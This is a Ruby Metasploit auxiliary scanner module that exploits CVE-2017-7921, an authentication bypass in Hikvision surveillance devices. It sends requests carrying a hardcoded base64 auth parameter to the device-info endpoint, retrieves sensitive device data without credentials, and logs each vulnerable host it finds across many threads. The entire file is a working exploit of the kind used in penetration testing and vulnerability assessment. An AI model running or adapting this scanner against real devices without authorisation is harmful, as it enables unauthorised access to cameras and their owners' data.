require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Hikvision Authentication Bypass',
      'Description'    => %q{
        This module exploits an authentication bypass in several Hikvision device models 
        that allows unauthenticated attackers to retrieve sensitive device information.
      },
      'Author'         => [ 'K3ysTr0K3R' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2017-7921' ],
          [ 'URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-17-124-01' ]
        ],
      'DisclosureDate' => 'Apr 28, 2017'
    ))

    register_options(
      [
        Opt::RPORT(80),
        OptBool.new('SSL', [ false, 'Negotiate SSL for outgoing connections', false ]),
        OptString.new('TARGETURI', [ true, 'The base path to the web application', '/']),
        OptInt.new('THREADS', [ true, 'Number of concurrent threads', 10 ])
      ]
    )
  end

  def run_host(ip)
    uri = normalize_uri(target_uri.path, 'system', 'deviceInfo')
    uri << '?auth=YWRtaW46MTEK'

    print_status("Attempting to connect to #{ip}#{uri}")
    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => uri,
    })

    if res && res.code == 200 && res.body.include?('<firmwareVersion>') && res.headers['Content-Type'].include?('application/xml')
      print_good("Vulnerable Hikvision device found: #{ip}#{uri}")
      report_note(
        host: ip,
        port: datastore['RPORT'],
        proto: 'tcp',
        sname: (datastore['SSL'] ? 'https' : 'http'),
        type: 'hikvision_auth_bypass',
        data: "Hikvision device at #{ip}#{uri} is vulnerable to CVE-2017-7921."
      )
      report_vuln(
        host: ip,
        name: 'Hikvision Authentication Bypass',
        refs: [
          SiteReference.new('CVE', '2017-7921'),
          SiteReference.new('URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-17-124-01')
        ],
        info: res.body
      )
    else
      print_status("Target is not vulnerable or not found: #{ip}#{uri}")
    end
  end
end
